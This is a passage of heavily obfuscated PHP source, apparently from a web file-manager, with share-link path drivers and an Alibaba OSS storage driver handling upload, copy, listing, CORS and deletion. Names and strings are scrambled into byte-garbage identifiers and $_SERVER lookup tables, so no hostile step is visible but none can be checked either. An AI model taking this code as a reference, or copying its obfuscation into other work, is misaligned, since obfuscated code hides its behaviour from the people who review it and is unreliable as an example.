$Ÿ¯Ğã‘Õ = '') { $•—ÈÇ® = get_path_father($Ÿ¯Ğã‘Õ); $ËÌÄŸ© = get_path_this($Ÿ¯Ğã‘Õ); $°ˆ¯†Ñ¹ = $this->model->fileInfoGet($æíƒÊ”°); $´Ù™Ãšö = IO::copy($°ˆ¯†Ñ¹[$_SERVER[¦»×‡Ãã][87]], $•—ÈÇ®, !1, $ËÌÄŸ©); return $´Ù™Ãšö; } public function setModifyTime($„Ä°æ, $ş¼±Çù‘ = '') { $í£üÌÌô =& $_SERVER[¦»×‡Ãã]; if (!$„Ä°æ) { return; } $this->model->where(array($í£üÌÌô[491] => $„Ä°æ))->save(array($í£üÌÌô[88] => $ş¼±Çù‘)); } public function upload($ã­´”×, $ù»ÔûŸ, $…íÂô®¡ = false, $Ô¬ÑîçÔ = REPEAT_REPLACE) { $ä™‘€š• =& $_SERVER[¦»×‡Ãã]; $ºòŠ®“ = $this->parse($ã­´”×); $ŠÎ§òëÀ = $this->model->addFile($ºòŠ®“[$ä™‘€š•[475]], $ù»ÔûŸ, $ºòŠ®“[$ä™‘€š•[87]], $…íÂô®¡, $Ô¬ÑîçÔ); return $this->getPathOuter($ŠÎ§òëÀ); } public function uploadFileByID($ûˆÌôı—, $£“æ«ø³, $àÌß‰ºû) { $ÙÈÓùŒ– =& $_SERVER[¦»×‡Ãã]; $Ÿ„ó€¿ı = $this->parse($ûˆÌôı—); $á›’Øç = $this->model->addFileByFileID($Ÿ„ó€¿ı[$ÙÈÓùŒ–[475]], $£“æ«ø³, $Ÿ„ó€¿ı[$ÙÈÓùŒ–[87]], $àÌß‰ºû); return $this->getPathOuter($á›’Øç); } public function addFileByRemote($³÷¨ÔÅ, $Ä¥û‡ƒÛ, $Øõ‡Ì± = array(), $å„§–¥ê = '', $Öá·îÁ) { $ÂÛ”ìö =& $_SERVER[¦»×‡Ãã]; $¯Æ‹³ƒü = $this->parse($³÷¨ÔÅ); $å„§–¥ê = empty($å„§–¥ê) ? $¯Æ‹³ƒü[$ÂÛ”ìö[87]] : $å„§–¥ê; $Èµã´šá = $this->model->addFileByRemote($¯Æ‹³ƒü[$ÂÛ”ìö[475]], $Ä¥û‡ƒÛ, $å„§–¥ê, $Øõ‡Ì±, $Öá·îÁ); return $this->getPathOuter($Èµã´šá); } public function uploadLink($¶Èİ¾Ï…, $²™âıä¯ = 0) { $š´Õ±­± =& $_SERVER[¦»×‡Ãã]; $¬Œé·½Ö = $this->parse($¶Èİ¾Ï…); $Şò—àÊá = _get($GLOBALS[$š´Õ±­±[7]], $š´Õ±­±[1422]); $µÀîÛØ = _get($GLOBALS[$š´Õ±­±[7]], $š´Õ±­±[1423]); $¶Èİ¾Ï… = Model($š´Õ±­±[674])->createFileName($¬Œé·½Ö[$š´Õ±­±[87]], $Şò—àÊá, $µÀîÛØ); return IO::uploadLink($¶Èİ¾Ï…, $²™âıä¯); } public function fileNameAuto($òåÅ¶ğ‰, $ˆêãªÌÔ, $âÛúÌÉú = REPEAT_REPLACE, $ûæ­ÍÚ• = false) { return $this->model->fileNameAuto($òåÅ¶ğ‰, $ˆêãªÌÔ, $âÛúÌÉú, $ûæ­ÍÚ•); } public function fileNameExist($›ªËÀê¢, $·Û«…³) { return $this->model->fileNameExist($›ªËÀê¢, $·Û«…³); } protected function _fileOut($ÓÜÖ¢–è, $€â•¡Ô = false, $²‰±êØ‡ = false, $±¿ÑÜ¶ = '', $ÒãÎ¶Û = false) { $ª‡âÀı¤ =& $_SERVER[¦»×‡Ãã]; $îı„ç©ö = $this->model->sourceInfo($ÓÜÖ¢–è); if ($îı„ç©ö[$ª‡âÀı¤[485]] == $ª‡âÀı¤[91]) { header($ª‡âÀı¤[1424]); die; } $¶ª„‰À = $this->model->fileInfoGet($ÓÜÖ¢–è); $±¿ÑÜ¶ = $¶ª„‰À[$ª‡âÀı¤[547]] ? $¶ª„‰À[$ª‡âÀı¤[547]] : $±¿ÑÜ¶; $Âï‰ï»ı = isset($GLOBALS[$ª‡âÀı¤[182]]) && is_array($GLOBALS[$ª‡âÀı¤[182]]) ? $GLOBALS[$ª‡âÀı¤[182]][$ª‡âÀı¤[32]] : $îı„ç©ö[$ª‡âÀı¤[32]]; if ($ÒãÎ¶Û) { return IO::fileOutServer($¶ª„‰À[$ª‡âÀı¤[87]], $€â•¡Ô, $Âï‰ï»ı, $±¿ÑÜ¶); } IO::fileOut($¶ª„‰À[$ª‡âÀı¤[87]], $€â•¡Ô, $Âï‰ï»ı, $±¿ÑÜ¶); } public function fileOut($Ã÷èÅ„‡, $ÄªÆÍ‹ = false, $ª‘â‘‡ = false, $°íÕ¼· = '') { $this->_fileOut($Ã÷èÅ„‡, $ÄªÆÍ‹, $ª‘â‘‡, $°íÕ¼·); } public function fileOutServer($çÜóÜ , $Œ¢ß¹Ô = false, $¶éğî¨Æ = false, $–°ÆŒ¡á = '') { $this->_fileOut($çÜóÜ , $Œ¢ß¹Ô, $¶éğî¨Æ, $–°ÆŒ¡á, !0); } protected function _fileOutImage($åˆëÔÄ, $Ä ©Ö = 250) { $µÜŸé´– =& $_SERVER[¦»×‡Ãã]; $ó§ö–Á÷ = $this->model->pathInfo($åˆëÔÄ); if ($ó§ö–Á÷[$µÜŸé´–[485]] == $µÜŸé´–[91]) { show_json($µÜŸé´–[1425] . $åˆëÔÄ, !1); } $˜×²¿ß× = $this->model->fileInfoGet($åˆëÔÄ); $ó§ö–Á÷[$µÜŸé´–[183]] = $˜×²¿ß×[$µÜŸé´–[87]]; $GLOBALS[$µÜŸé´–[182]] = $ó§ö–Á÷; IO::fileOutImage($˜×²¿ß×[$µÜŸé´–[87]], $Ä ©Ö); } public function fileOutImage($ç­ì¸, $¦ğ¬İ£ = 250) { $this->_fileOutImage($ç­ì¸, $¦ğ¬İ£); } public function fileOutImageServer($¬»ÏÀ£˜, $½¾¯æ‘Ş = 250) { $this->_fileOutImage($¬»ÏÀ£˜, $½¾¯æ‘Ş); } public function link($¹¿§¡ê¿, $¼ˆŞ» = '') { $èê¼ŞÃà = $this->model->fileInfoGet($¹¿§¡ê¿); return IO::link($èê¼ŞÃà[$_SERVER[¦»×‡Ãã][87]], $¼ˆŞ»); } protected function parse($»ò˜ˆÅÉ) { $Ø½¸¨ =& $_SERVER[¦»×‡Ãã]; if (strstr($»ò˜ˆÅÉ, $Ø½¸¨[8]) === !1) { return array($Ø½¸¨[493] => intval($»ò˜ˆÅÉ), $Ø½¸¨[87] => $Ø½¸¨[12], $Ø½¸¨[1421] => array()); } $û¨ºôğ® = explode($Ø½¸¨[8], trim($»ò˜ˆÅÉ, $Ø½¸¨[8])); if (count($û¨ºôğ®) < 2) { show_tips(clear_html($»ò˜ˆÅÉ) . $Ø½¸¨[1426]); } return array($Ø½¸¨[493] => intval($û¨ºôğ®[0]), $Ø½¸¨[87] => $û¨ºôğ®[1], $Ø½¸¨[1421] => array_slice($û¨ºôğ®, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($±å¦¿¶ä) { $this->pathParse = $±å¦¿¶ä; $this->model = Model($_SERVER[¦»×‡Ãã][1420]); } public function getPathOuter($ÜÅõ˜Ö´) { $ Ï½¬Š® =& $_SERVER[¦»×‡Ãã]; if (!$ÜÅõ˜Ö´) { return $ÜÅõ˜Ö´; } $¶Ö³­ = $this->parse($ÜÅõ˜Ö´); return trim(KodIO::makeShare($this->pathParse[$ Ï½¬Š®[475]], $¶Ö³­[$ Ï½¬Š®[475]]), $ Ï½¬Š®[8]); } protected function infoParse($®Ïã¶š´, $ôÌú„ò = false, $Ì¨æš®¼ = false) { $à¼Úâëå =& $_SERVER[¦»×‡Ãã]; $ÕõĞ·½ = $this->pathParse[$à¼Úâëå[475]]; $½¼ª£ä¡ = trim($this->pathParse[$à¼Úâëå[1250]], $à¼Úâëå[8]); return Action($à¼Úâëå[1427])->sharePathInfo($ÕõĞ·½, $½¼ª£ä¡, $ôÌú„ò); } public function infoFull($ş³€ÈçÆ) { $ÅÆ†’† =& $_SERVER[¦»×‡Ãã]; $İÉ¡ÈÜ  = explode($ÅÆ†’†[8], trim($ş³€ÈçÆ, $ÅÆ†’†[8])); if (count($İÉ¡ÈÜ ) > 1) { $¦ñ³Óğù = implode($ÅÆ†’†[8], array_splice($İÉ¡ÈÜ , 1)); $åÄ×ĞØ½ = $this->model->pathInfoByPath($İÉ¡ÈÜ [0], $¦ñ³Óğù); if (!$åÄ×ĞØ½) { return !1; } $this->pathParse[$ÅÆ†’†[1250]] = $åÄ×ĞØ½[$ÅÆ†’†[193]]; } return $this->infoParse($ş³€ÈçÆ); } public function listAll($—±¯Ò³á) { $™ëÎ¯áı =& $_SERVER[¦»×‡Ãã]; $Ÿş·Ù¸û = IO::info($this->pathParse[$™ëÎ¯áı[87]]); if (!$Ÿş·Ù¸û) { return array(); } $ÒÈññŞË = $this->model->listAll($—±¯Ò³á); $ó„»‹Š§ = Model($™ëÎ¯áı[664])->getInfo($Ÿş·Ù¸û[$™ëÎ¯áı[665]]); foreach ($ÒÈññŞË as &$ÊôéÈÀ) { check_abort(); $ÊôéÈÀ[$™ëÎ¯áı[90]] = Action($™ëÎ¯áı[1427])->_shareItemeParse($ÊôéÈÀ[$™ëÎ¯áı[90]], $ó„»‹Š§); } unset($ÊôéÈÀ); return $ÒÈññŞË; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($¸â·ñ³Ï) { $this->pathParse = $¸â·ñ³Ï; $this->model = Model($_SERVER[¦»×‡Ãã][1420]); } protected function infoParse($¶‚Ì’à, $øûºª¶ğ = false, $Ñ•ÂùĞÔ = false) { $ìŞı™ÈÑ =& $_SERVER[¦»×‡Ãã]; return Action($ìŞı™ÈÑ[1256])->sharePathInfo($this->pathParse[$ìŞı™ÈÑ[87]], !0, $øûºª¶ğ); } public function listPath($ˆì–ş, $”õÏæ¼¬ = false) { $˜“×œœ² =& $_SERVER[¦»×‡Ãã]; $´÷—¥° = parent::listPath($ˆì–ş, $”õÏæ¼¬); if (!$´÷—¥°) { return $´÷—¥°; } if (is_array($´÷—¥°[$˜“×œœ²[1428]])) { $´÷—¥°[$˜“×œœ²[1428]] = Action($˜“×œœ²[1256])->shareItemInfo($´÷—¥°[$˜“×œœ²[1428]]); } foreach ($´÷—¥° as $ßÑ­£¬‚ => $Åµ¯Ş×) { if (!in_array($ßÑ­£¬‚, array($˜“×œœ²[86], $˜“×œœ²[85]))) { continue; } foreach ($Åµ¯Ş× as $»ÇÖ›ÕÖ => $£‹åøÛ) { $´÷—¥°[$ßÑ­£¬‚][$»ÇÖ›ÕÖ] = Action($˜“×œœ²[1256])->shareItemInfo($£‹åøÛ); } } return $´÷—¥°; } public function listAll($îÓ•Èü) { $–ËÒ²Õ =& $_SERVER[¦»×‡Ãã]; $·ÉÌö‚† = IO::info($this->pathParse[$–ËÒ²Õ[87]]); if (!$·ÉÌö‚†) { return array(); } $¸œÜ = $this->model->listAll($îÓ•Èü); foreach ($¸œÜ as &$ı”ò·é) { $ı”ò·é[$–ËÒ²Õ[90]] = Action($–ËÒ²Õ[1256])->shareItemInfo($ı”ò·é[$–ËÒ²Õ[90]]); } unset($ı”ò·é); return $¸œÜ; } } goto aòœİÎ…”; cÉÜÃİ§Ş: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($ñÓÜÚ) { parent::__construct(); include_once SDK_DIR . $_SERVER[¦»×‡Ãã][1462]; $this->_init($ñÓÜÚ); } public function _init($ù‰î¢Ğù) { $‰ºà =& $_SERVER[¦»×‡Ãã]; $this->config = $ù‰î¢Ğù; foreach ($ù‰î¢Ğù as $éªùû‹ı => $µšé–ö­) { if (isset($this->{$éªùû‹ı})) { $this->{$éªùû‹ı} = $µšé–ö­; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($‰ºà[1463] . LNG($‰ºà[1464])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $„¹Àéú  =& $_SERVER[¦»×‡Ãã]; $ßñè½±¿ = new OSS\Model\CorsConfig(); $ŸŠ·È©š = new OSS\Model\CorsRule(); $ŸŠ·È©š->addAllowedOrigin($„¹Àéú [1465]); $ŸŠ·È©š->addAllowedMethod($„¹Àéú [1466]); $ŸŠ·È©š->addAllowedMethod($„¹Àéú [1467]); $ŸŠ·È©š->addAllowedMethod($„¹Àéú [1468]); $ŸŠ·È©š->addAllowedMethod($„¹Àéú [1469]); $ŸŠ·È©š->addAllowedMethod($„¹Àéú [165]); $ŸŠ·È©š->setMaxAgeSeconds(600); $ŸŠ·È©š->addExposeHeader($„¹Àéú [1470]); $ŸŠ·È©š->addAllowedHeader($„¹Àéú [1465]); $ßñè½±¿->addRule($ŸŠ·È©š); try { $this->client->putBucketCors($this->bucket, $ßñè½±¿); } catch (OSS\Core\OssException $×ù¬¤Ä¦) { $this->writeLog(__FUNCTION__ . $„¹Àéú [214] . $×ù¬¤Ä¦->getMessage()); return !1; } return !0; } public function getBucketCors() { $«¸±ÀÛ« =& $_SERVER[¦»×‡Ãã]; $ÂÑ¦íË = null; try { $ÂÑ¦íË = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $¸ìø©¶¬) { $this->writeLog(__FUNCTION__ . $«¸±ÀÛ«[214] . $¸ìø©¶¬->getMessage()); return null; } if (!$ÂÑ¦íË || !($şÁŞñ‚Ã = $ÂÑ¦íË->getRules())) { return null; } $©Ó¾¸Ã÷ = $şÁŞñ‚Ã[0]->getAllowedOrigins(); $ÖªÓòå” = $şÁŞñ‚Ã[0]->getAllowedMethods(); $³Å€†ŸÛ = $şÁŞñ‚Ã[0]->getMaxAgeSeconds(); $©¼é˜ª” = $şÁŞñ‚Ã[0]->getExposeHeaders(); $ĞÂøÆ¢ = $şÁŞñ‚Ã[0]->getAllowedHeaders(); return array($«¸±ÀÛ«[218] => isset($©Ó¾¸Ã÷[0]) ? $©Ó¾¸Ã÷[0] : $«¸±ÀÛ«[12], $«¸±ÀÛ«[222] => $ÖªÓòå”, $«¸±ÀÛ«[1471] => $³Å€†ŸÛ, $«¸±ÀÛ«[1472] => isset($©¼é˜ª”[0]) ? $©¼é˜ª”[0] : $«¸±ÀÛ«[12], $«¸±ÀÛ«[219] => isset($ĞÂøÆ¢[0]) ? $ĞÂøÆ¢[0] : $«¸±ÀÛ«[12]); } public function isBucketCors() { $Œ°şŒàÒ =& $_SERVER[¦»×‡Ãã]; $ƒ¥ÆÈŞ = $this->getBucketCors(); if (!$ƒ¥ÆÈŞ || !is_array($ƒ¥ÆÈŞ)) { return !1; } if ($ƒ¥ÆÈŞ[$Œ°şŒàÒ[218]] != $Œ°şŒàÒ[220] || $ƒ¥ÆÈŞ[$Œ°şŒàÒ[219]] != $Œ°şŒàÒ[220]) { return !1; } $§š™¡¨ß = array_map($Œ°şŒàÒ[221], $ƒ¥ÆÈŞ[$Œ°şŒàÒ[222]]); if (!is_array($§š™¡¨ß)) { $§š™¡¨ß = array(); } $­áƒ‰Äî = array($Œ°şŒàÒ[223], $Œ°şŒàÒ[224], $Œ°şŒàÒ[225], $Œ°şŒàÒ[226], $Œ°şŒàÒ[227]); $ë÷ïùùÆ = array_diff($­áƒ‰Äî, $§š™¡¨ß); return empty($ë÷ïùùÆ); } public function mkfile($–ƒãÃº, $ºÔ§šÒ‚ = '', $ØŠö‚üŞ = REPEAT_RENAME) { $ĞğıŸÉ© = $this->setContent($–ƒãÃº, $ºÔ§šÒ‚); if ($ĞğıŸÉ© !== !1) { return $this->getPathOuter($–ƒãÃº); } return !1; } public function mkdir($•šõï¾Ñ, $Æ˜›õØ = REPEAT_SKIP) { if ($Æ˜›õØ && $this->_isFolder($•šõï¾Ñ)) { return $this->getPathOuter($•šõï¾Ñ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($•šõï¾Ñ)); } catch (OSS\Core\OssException $ßøÃ•²ë) { $this->writeLog(__FUNCTION__ . $_SERVER[¦»×‡Ãã][214] . $ßøÃ•²ë->getMessage()); return !1; } return $this->getPathOuter($•šõï¾Ñ); } private function fileList($‘íõØÄ, $Ä‚Ãşß = '', $Ò£æóè‹ = 0) { $³§ì¯‹š =& $_SERVER[¦»×‡Ãã]; $‘íõØÄ = trim($‘íõØÄ, $³§ì¯‹š[8]); $¤¢¡¾¨” = empty($‘íõØÄ) && $‘íõØÄ !== $³§ì¯‹š[228] ? $³§ì¯‹š[12] : $‘íõØÄ . $³§ì¯‹š[8]; $½³ú®µ” = $³§ì¯‹š[12]; $‰ùõÙ¶ = 1000; $±…‰Ø¢Ô = $²ì—šØ = array(); while (!0) { check_abort(); $ñ¢ĞÁğ’ = array($³§ì¯‹š[1473] => $Ä‚Ãşß, $³§ì¯‹š[1474] => $¤¢¡¾¨”, $³§ì¯‹š[1475] => $‰ùõÙ¶, $³§ì¯‹š[1476] => $½³ú®µ”); try { $ïŠéî = $this->client->listObjects($this->bucket, $ñ¢ĞÁğ’); } catch (OSS\Core\OssException $Ñô›àæ») { $this->writeLog(__FUNCTION__ . $³§ì¯‹š[214] . $Ñô›àæ»->getMessage()); break; } $½³ú®µ” = $ïŠéî->getNextMarker(); $É²¾Ø“˜ = $ïŠéî->getObjectList(); $·¤›£‰Ä = $ïŠéî->getPrefixList(); foreach ($É²¾Ø“˜ as $Õ¶óÍı×) { if ($Õ¶óÍı×->getKey() == $¤¢¡¾¨”) { continue; } $ìœ×© = $Õ¶óÍı×->getKey(); $ŞİıŠ®’ = $Õ¶óÍı×->getSize(); $³ä¢ŞÇ = $Õ¶óÍı×->getLastModified(); $†À›ÔÌğ = trim($Õ¶óÍı×->getETag(), $³§ì¯‹š[121]); $„Å²È¶ƒ = $Ò£æóè‹ ? array($³§ì¯‹š[32] => $ìœ×©, $³§ì¯‹š[79] => $ŞİıŠ®’, $³§ì¯‹š[206] => strtotime($³ä¢ŞÇ), $³§ì¯‹š[1477] => $†À›ÔÌğ) : $ìœ×©; $†³¥©… = $ŞİıŠ®’ == 0 && substr($ìœ×©, strlen($ìœ×©) - 1, 1) == $³§ì¯‹š[8] ? !0 : !1; $ˆÄìÊßä = array($³§ì¯‹š[79] => $ŞİıŠ®’, $³§ì¯‹š[1478] => $ŞİıŠ®’, $³§ì¯‹š[88] => strtotime($³ä¢ŞÇ), $³§ì¯‹š[1479] => $³ä¢ŞÇ, $³§ì¯‹š[1477] => $†À›ÔÌğ); $this->cacheMethodInfoSet($ìœ×©, $†³¥©…, $ˆÄìÊßä); if ($†³¥©…) { $±…‰Ø¢Ô[] = $ìœ×©; continue; } $²ì—šØ[] = $„Å²È¶ƒ; } foreach ($·¤›£‰Ä as $°âÏá™¿) { $±…‰Ø¢Ô[] = $°âÏá™¿->getPrefix(); $this->cacheMethodInfoSet($°âÏá™¿->getPrefix(), !0); } if ($½³ú®µ” === $³§ì¯‹š[12]) { break; } } $this->cacheMethodInfoSet($‘íõØÄ, !0); return array($³§ì¯‹š[85] => $±…‰Ø¢Ô, $³§ì¯‹š[86] => $²ì—šØ); } public function listObject($Å‹ñ’ûù, $ˆÜªÒû¬ = '') { $¿ÎùÓ…Ÿ =& $_SERVER[¦»×‡Ãã]; $Å‹ñ’ûù = trim($Å‹ñ’ûù, $¿ÎùÓ…Ÿ[8]); $ÕìËÅŞ = empty($Å‹ñ’ûù) && $Å‹ñ’ûù !== $¿ÎùÓ…Ÿ[228] ? $¿ÎùÓ…Ÿ[12] : $Å‹ñ’ûù . $¿ÎùÓ…Ÿ[8]; $±Êşˆä = $¿ÎùÓ…Ÿ[12]; $Ø¨ÔŸš = 1000; $Îõ¤Á’Ï = $‚§»²¾Ù = array(); while (!0) { check_abort(); $‰„ù × = array($¿ÎùÓ…Ÿ[1473] => $ˆÜªÒû¬, $¿ÎùÓ…Ÿ[1474] => $ÕìËÅŞ, $¿ÎùÓ…Ÿ[1475] => $Ø¨ÔŸš, $¿ÎùÓ…Ÿ[1476] => $±Êşˆä); try { $¦î¼¤šÈ = $this->client->listObjects($this->bucket, $‰„ù ×); } catch (OSS\Core\OssException $òš±ä³) { $this->writeLog(__FUNCTION__ . $¿ÎùÓ…Ÿ[214] . $òš±ä³->getMessage()); break; } $±Êşˆä = $¦î¼¤šÈ->getNextMarker(); $æ É„ûú = $¦î¼¤šÈ->getObjectList(); foreach ($æ É„ûú as $ÒÕÒ—ê˜) { if ($ÒÕÒ—ê˜->getKey() == $ÕìËÅŞ) { continue; } $€³‰ü«Ò = $ÒÕÒ—ê˜->getKey(); $Ñ§ƒºê­ = $ÒÕÒ—ê˜->getSize(); $„ƒõËîù = $Ñ§ƒºê­ == 0 && substr($€³‰ü«Ò, strlen($€³‰ü«Ò) - 1, 1) == $¿ÎùÓ…Ÿ[8] ? !0 : !1; if ($„ƒõËîù) { continue; } (yield $Ñ§ƒºê­ . $¿ÎùÓ…Ÿ[214] . $€³‰ü«Ò); } if ($±Êşˆä === $¿ÎùÓ…Ÿ[12]) { break; } } } public function copyFile($¥Ñ·¸Û‘, $ìîıÈ×ø) { $µİ´šŒÑ = $this->size($¥Ñ·¸Û‘); if ($µİ´šŒÑ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $¥Ñ·¸Û‘, $this->bucket, $this->pathEncode($ìîıÈ×ø)); } catch (OSS\Core\OssException $³å¬şïÏ) { $this->writeLog(__FUNCTION__ . $_SERVER[¦»×‡Ãã][214] . $³å¬şïÏ->getMessage()); return !1; } return $this->getPathOuter($ìîıÈ×ø); } $Éß²„ç» = $this->multiCopyObject($¥Ñ·¸Û‘, $ìîıÈ×ø, $µİ´šŒÑ); return $Éß²„ç» ? $this->getPathOuter($ìîıÈ×ø) : !1; } private function multiCopyObject($õ½ôµ¨½, $èÖı›Û¼, $¿ûûùº) { $¦¼–‘øâ =& $_SERVER[¦»×‡Ãã]; try { $ş™¢çÕø = array(); if ($ ‘ä“¿ø = $this->hashMd5($õ½ôµ¨½)) { $ş™¢çÕø = array(OSS\OssClient::OSS_HEADERS => array($¦¼–‘øâ[1480] => $ ‘ä“¿ø)); } $‚¿é—™¡ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($èÖı›Û¼), $ş™¢çÕø); $îó†Âá = 1; $•é™˜ø¼ = 0; $÷÷¯üşˆ = array(); $ÇÑéÊöÇ = 1024 * 1024 * 10; $åÄ¡¸â„ = $this->client->generateMultiuploadParts($¿ûûùº, $ÇÑéÊöÇ); foreach ($åÄ¡¸â„ as $²ÈÛ Îß => $±œÛ¨Ù§) { $Ÿ–™¯²  = $•é™˜ø¼ + (int) $±œÛ¨Ù§[$¦¼–‘øâ[1481]]; $ëğš‡šà = (int) $±œÛ¨Ù§[$¦¼–‘øâ[413]] + $Ÿ–™¯²  - 1; $úß¡ô‰è = array($¦¼–‘øâ[167] => $Ÿ–™¯² , $¦¼–‘øâ[168] => $ëğš‡šà); $÷÷¯üşˆ[] = $this->client->uploadPartCopy($this->bucket, $õ½ôµ¨½, $this->bucket, $this->pathEncode($èÖı›Û¼), $îó†Âá, $‚¿é—™¡, $úß¡ô‰è); $îó†Âá = $îó†Âá + 1; } $¦ô „Æğ = array(); foreach ($÷÷¯üşˆ as $²ÈÛ Îß => $ğîóŒè¸) { $¦ô „Æğ[] = array($¦¼–‘øâ[308] => $²ÈÛ Îß + 1, $¦¼–‘øâ[309] => $ğîóŒè¸); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($èÖı›Û¼), $‚¿é—™¡, $¦ô „Æğ); } catch (OSS\Core\OssException $¸ùÛğ†¥) { $this->writeLog(__FUNCTION__ . $¦¼–‘øâ[214] . $¸ùÛğ†¥->getMessage()); return !1; } return !0; } public function moveFile($Ìºƒ–±×, $ÏòßÇ¹á) { if ($this->copyFile($Ìºƒ–±×, $ÏòßÇ¹á)) { $this->remove($Ìºƒ–±×); return $this->getPathOuter($ÏòßÇ¹á); } return !1; } public function delFile($ßšØŞ³à) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($ßšØŞ³à)); } catch (OSS\Core\OssException $©…™Å²×) { $this->writeLog(__FUNCTION__ . $_SERVER[¦»×‡Ãã][214] . $©…™Å²×->getMessage()); return !1; } return !0; } public function delFolder($Œ¶ô‰) { $•ĞßÜ®Ù =& $_SERVER[¦»×‡Ãã]; if (!$this->exist($Œ¶ô‰)) { return !0; } $this->listItemCache = !1; $Öã©Çä‘ = $this->fileList($Œ¶ô‰); $this->listItemCache = !0; $’´öÍª = trim($Œ¶ô‰, $•ĞßÜ®Ù[8]) . $•ĞßÜ®Ù[8]; if (!empty($Œ¶ô‰) && $Œ¶ô‰ !== $•ĞßÜ®Ù[228] && !in_array($’´öÍª, $Öã©Çä‘[$•ĞßÜ®Ù[85]])) { $Öã©Çä‘[$•ĞßÜ®Ù[85]][] = $’´öÍª; } $ãÃåÜùÆ = $this->delByBatch($Öã©Çä‘[$•ĞßÜ®Ù[86]]); if (!$ãÃåÜùÆ) { return !1; } $ãÃåÜùÆ = $this->delByBatch($Öã©Çä‘[$•ĞßÜ®Ù[85]]); if (!$ãÃåÜùÆ) { return !1; } return $this->delFile($’´öÍª); } private function delByBatch($Ç°½Ù­Õ) { foreach (array_chunk($Ç°½Ù­Õ, 1000) as $µ®Âß¸ç) { try { $this->client->deleteObjects($this->bucket, $µ®Âß¸ç); } catch (OSS\Core\OssException $‘ËŸŸ¼¬) { $this->writeLog(__FUNCTION__ . $_SERVER[¦»×‡Ãã][214] . $‘ËŸŸ¼¬->getMessage()); return !1; } } return !0; } public function rename($ê÷ ı‘š, $´¬áÜêä) { return $this->renameObject($ê÷ ı‘š, $´¬áÜêä); } private function fileInfo($¼ûş«ô«, $Åšğ¸¥Ä = false, $’ˆç«—£ = array()) { $©Å¶İ˜â =& $_SERVER[¦»×‡Ãã]; $€ØûÎ¤ö = array($©Å¶İ˜â[32] => $this->pathThis($¼ûş«ô«), $©Å¶İ˜â[87] => $this->getPathOuter($¼ûş«ô«), $©Å¶İ˜â[33] => $©Å¶İ˜â[230], $©Å¶İ˜â[79] => isset($’ˆç«—£[$©Å¶İ˜â[79]]) ? $’ˆç«—£[$©Å¶İ˜â[79]] : 0, $©Å¶İ˜â[169] => $this->ext($¼ûş«ô«)); if ($Åšğ¸¥Ä) { return $€ØûÎ¤ö; } $€ØûÎ¤ö[$©Å¶İ˜â[231]] = $€ØûÎ¤ö[$©Å¶İ˜â[88]] = 0; $€ØûÎ¤ö[$©Å¶İ˜â[232]] = $€ØûÎ¤ö[$©Å¶İ˜â[233]] = !0; if (empty($’ˆç«—£)) { $×ÉÃõ˜À = $this->objectMeta($¼ûş«ô«); if (!$×ÉÃõ˜À) { return $€ØûÎ¤ö; } $’ˆç«—£ = array($©Å¶İ˜â[88] => strtotime($×ÉÃõ˜À[$©Å¶İ˜â[1479]]), $©Å¶İ˜â[79] => $×ÉÃõ˜À[$©Å¶İ˜â[1478]] + 0, $©Å¶İ˜â[1477] => $×ÉÃõ˜À[$©Å¶İ˜â[1477]]); } if (isset($’ˆç«—£[$©Å¶İ˜â[1477]]) && $’ˆç«—£[$©Å¶İ˜â[1477]]) { $€ØûÎ¤ö[$©Å¶İ˜â[235]] = trim($’ˆç«—£[$©Å¶İ˜â[1477]], $©Å¶İ˜â[121]); } if (isset($’ˆç«—£[$©Å¶İ˜â[79]])) { $€ØûÎ¤ö[$©Å¶İ˜â[79]] = $’ˆç«—£[$©Å¶İ˜â[79]]; } if (isset($’ˆç«—£[$©Å¶İ˜â[88]])) { $€ØûÎ¤ö[$©Å¶İ˜â[88]] = $’ˆç«—£[$©Å¶İ˜â[88]]; } if (isset($’ˆç«—£[$©Å¶İ˜â[206]]) && !trim($€ØûÎ¤ö[$©Å¶İ˜â[88]])) { $€ØûÎ¤ö[$©Å¶İ˜â[88]] = $’ˆç«—£[$©Å¶İ˜â[206]]; } return $€ØûÎ¤ö; } private function folderInfo($ùòÏ×âŠ, $ïÇš÷¿À = false, $‘¦·Ù²» = array()) { $×ƒò¶Æ… =& $_SERVER[¦»×‡Ãã]; $†ÈÜÛæ³ = array($×ƒò¶Æ…[32] => $this->pathThis($ùòÏ×âŠ), $×ƒò¶Æ…[87] => $this->getPathOuter($×ƒò¶Æ…[8] . $ùòÏ×âŠ), $×ƒò¶Æ…[33] => $×ƒò¶Æ…[78]); if ($ïÇš÷¿À) { return $†ÈÜÛæ³; } $†ÈÜÛæ³[$×ƒò¶Æ…[231]] = $†ÈÜÛæ³[$×ƒò¶Æ…[88]] = 0; $†ÈÜÛæ³[$×ƒò¶Æ…[232]] = $†ÈÜÛæ³[$×ƒò¶Æ…[233]] = !0; if (empty($‘¦·Ù²»)) { $ùòÏ×âŠ = rtrim($ùòÏ×âŠ, $×ƒò¶Æ…[8]) . $×ƒò¶Æ…[8]; $ì’»ÙÅô = $this->objectMeta($ùòÏ×âŠ); if (!$ì’»ÙÅô) { return $†ÈÜÛæ³; } $‘¦·Ù²» = array($×ƒò¶Æ…[231] => $ì’»ÙÅô[$×ƒò¶Æ…[575]][$×ƒò¶Æ…[1482]], $×ƒò¶Æ…[88] => strtotime($ì’»ÙÅô[$×ƒò¶Æ…[1479]])); } if (isset($‘¦·Ù²»[$×ƒò¶Æ…[88]])) { $†ÈÜÛæ³[$×ƒò¶Æ…[88]] = $‘¦·Ù²»[$×ƒò¶Æ…[88]]; } if (isset($‘¦·Ù²»[$×ƒò¶Æ…[231]])) { $†ÈÜÛæ³[$×ƒò¶Æ…[231]] = $‘¦·Ù²»[$×ƒò¶Æ…[231]]; } return 